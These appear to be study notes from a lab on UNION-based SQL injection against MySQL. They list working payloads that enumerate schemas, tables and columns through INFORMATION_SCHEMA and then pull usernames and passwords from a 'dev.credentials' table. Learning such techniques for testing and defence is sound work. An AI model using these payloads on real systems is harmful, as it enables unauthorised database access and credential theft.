#SQL_Injection 

---

- To list all the database names in our system we use the following syntax:
```bash
mysql> SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;

+--------------------+
| SCHEMA_NAME        |
+--------------------+
| mysql              |
| information_schema |
| performance_schema |
| ilfreight          |
| dev                |
+--------------------+
6 rows in set (0.01 sec)
```

**Note**: The column name is **SCHEMA_NAME**, DB name is **INFORMATION_SCHEMA** and table name is **SCHEMATA**

- We can obtain the above using using an **SLQ Injection** with **UNION** as follows:
```sql
cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
```


- To obain all the tables from a given DB(i.e. `dev`) we use the following command:
```sql
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
```

- To then select all the the columns from a given table(i.e., `credentials`) listed from the above command we use the following command:
```sql
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
```

- And then from the above command, we can filter based on certain columns
```sql
cn' UNION select 1,username,password,4 from dev.credentials-- -
```
